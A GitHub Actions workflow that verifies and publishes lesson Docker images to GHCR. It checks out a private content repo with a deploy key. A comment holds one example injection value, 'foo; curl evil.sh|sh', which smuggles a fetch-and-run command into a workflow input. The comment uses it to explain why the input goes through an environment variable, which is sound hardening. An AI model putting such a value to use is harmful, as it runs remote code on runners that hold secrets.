name: publish-lesson-images

# Lesson images must be published from THIS repo, not from devable.
# A package published by an Actions workflow inherits that workflow
# repository's visibility. devable-companion is public, so packages land
# public; devable is private, so publishing there would make every lesson
# image private and every learner's pull fail with a silent 403.
on:
  workflow_dispatch:
    inputs:
      images:
        description: "Space-separated image names (e.g. 'react-custom-hooks react-routing')"
        required: true
        type: string
      ref:
        description: "Branch or SHA of devable-dev/devable to build from"
        required: false
        type: string
        default: main

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    steps:
      - name: Check out the private content repo
        uses: actions/checkout@v4
        with:
          repository: devable-dev/devable
          ref: ${{ inputs.ref }}
          ssh-key: ${{ secrets.DEVABLE_CONTENT_SSH_KEY }}
          path: devable

      - uses: actions/setup-go@v5
        with:
          go-version-file: devable/apps/backend/go.mod

      - uses: docker/setup-qemu-action@v3

      - uses: docker/setup-buildx-action@v3

      - name: Log in to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      # The gate is the point of publishing from CI: seed must FAIL and
      # solution must PASS every direction, for every image, every time.
      #
      # IMAGES is passed via env, not interpolated directly into `run:` —
      # direct interpolation of a workflow_dispatch input into a run script
      # is a command-injection vector (e.g. `images: "foo; curl evil.sh|sh"`)
      # on a runner that holds DEVABLE_CONTENT_SSH_KEY (read-only) and
      # packages:write. The read-only key bounds what an injected command
      # could do with repo access; it doesn't bound packages:write, which is
      # why IMAGES is still routed through env instead of raw interpolation.
      # The env var still word-splits the same way the raw input would.
      - name: Verify and push
        working-directory: devable
        env:
          IMAGES: ${{ inputs.images }}
        run: ./scripts/build-lesson-images.sh --push --ci $IMAGES
